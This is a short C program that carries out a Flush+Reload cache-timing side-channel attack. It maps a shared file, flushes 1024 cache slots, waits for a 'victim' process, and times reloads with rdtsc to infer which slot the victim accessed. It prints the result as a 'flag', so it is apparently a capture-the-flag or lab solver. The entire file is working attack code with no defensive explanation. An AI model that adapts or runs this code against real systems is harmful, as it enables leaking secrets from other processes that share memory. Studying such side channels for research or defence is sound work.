#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define SIZE 131072
#define NUM_SLOTS 1024
#define SLOT_SIZE 128

static inline uint64_t rdtsc_begin(void) {
    _mm_lfence();
    return __rdtsc();
}

static inline uint64_t rdtsc_end(void) {
    unsigned int aux;
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

int main(void) {
    int fd = open("shared_file", O_RDONLY);
    if (fd < 0) { perror("open shared_file"); return 1; }

    void *map = mmap(NULL, SIZE, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(fd); return 1; }
    close(fd);

    volatile unsigned char *buf = (volatile unsigned char *)map;

    uint64_t total_times[NUM_SLOTS] = {0};
    int samples[NUM_SLOTS] = {0};
    int order[NUM_SLOTS];
    uint32_t rng = 0x9e3779b9u;

    for (int i = 0; i < NUM_SLOTS; i++)
        order[i] = i;

    for (int r = 0; r < 10000; r++) {
        for (int i = NUM_SLOTS - 1; i > 0; i--) {
            rng ^= rng << 13;
            rng ^= rng >> 17;
            rng ^= rng << 5;
            int j = (int)(rng % (unsigned)(i + 1));
            int tmp = order[i];
            order[i] = order[j];
            order[j] = tmp;
        }

        // flush
        for (int i = 0; i < NUM_SLOTS; i++)
            _mm_clflush((void *)&buf[order[i] * SLOT_SIZE]);

        // wait longer for victim to run
        for (volatile int i = 0; i < 100000; i++);

        // reload in randomized order and accumulate timings
        for (int i = 0; i < NUM_SLOTS; i++) {
            int slot = order[i];
            uint64_t t0 = rdtsc_begin();
            volatile unsigned char v = buf[slot * SLOT_SIZE];
            uint64_t t1 = rdtsc_end();
            (void)v;
            unsigned long dt = t1 - t0;
            total_times[slot] += dt;
            samples[slot]++;
        }
    }

    // find slot with the lowest average access time
    int winner = 0;
    for (int i = 1; i < NUM_SLOTS; i++)
        if (total_times[i] < total_times[winner])
            winner = i;

    printf("flag = %d\n", winner);
    printf("Top 5 slots:\n");

    uint64_t remaining_times[NUM_SLOTS];
    for (int i = 0; i < NUM_SLOTS; i++)
        remaining_times[i] = total_times[i];

    for (int rank = 0; rank < 5; rank++) {
        int best = 0;
        for (int i = 1; i < NUM_SLOTS; i++)
            if (remaining_times[i] < remaining_times[best])
                best = i;
        printf("rank %d: slot=%d hits=%d avg=%lu\n",
               rank + 1,
               best,
               samples[best],
               (unsigned long)(remaining_times[best] / (uint64_t)samples[best]));
        remaining_times[best] = UINT64_MAX;
    }


    munmap((void *)buf, SIZE);
    return 0;
}